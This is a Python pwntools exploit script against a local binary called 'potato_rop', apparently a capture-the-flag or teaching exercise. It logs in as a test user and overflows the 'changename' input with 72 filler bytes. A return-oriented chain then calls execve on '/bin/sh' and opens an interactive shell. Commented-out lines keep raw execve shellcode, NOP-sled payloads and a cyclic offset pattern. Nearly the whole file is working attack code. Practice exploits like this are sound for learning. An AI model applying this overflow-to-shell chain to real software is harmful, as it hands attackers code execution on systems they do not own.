#!/usr/bin/env python3

from pwn import *
import sys


# context.terminal = ["kitty", "sh", "-c"]

FPRINTFPLT = 0x40e7a0
PUTSPLT = 0x41e840
EXECVE = 0x446dd0
EXIT = 0x40cd20

POP_RDI = 0x00000000004057d1
POP_RSI = 0x000000000040cdba

FOOBAR = 0x00000000004a172d

BIN_SH = 0x4dbfa7
ZERO_MEM = 0x4da000

elf = ELF("./potato_rop")

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break func.c:185
break func.c:192
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username
# logged in
#p.interactive()
p.sendline(b"changename")

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
# shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

# payload=b"\x41"*64 + p64(0x7fffffffd9f0) + p64(0x4041a3)
# payload = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf'
# payload = b'abc'
# payload = b'\x41' * 50
# payload = shellcode + b'\x90' * (72 - len(shellcode)) + p64(0x7fffffffd2c0)
# payload = shellcode + b'\x90' * (72 - len(shellcode)) + p64(0x7fffffffd9b0)
# payload = b'\x41' * 72 + p64(0xffffffffffffffff)
# payload = b''.join([b'\x41'*72, p64(0x4030ca), p64(0x438c10), p64(0x4032a2), p64(0x407680), p64(0x4dbfa7)])
# payload = b''.join([b'\x41'*72, p64(POP_RDI), p64(FOOBAR), p64(PUTSPLT)])
payload = b''.join([b'\x41'*72, p64(POP_RDI), p64(BIN_SH), p64(POP_RSI), p64(BIN_SH - 8), p64(EXECVE)])

p.sendline(payload)
#p.recvline_startswith(b"cmd>")
#p.sendline(b"whoami")


p.interactive()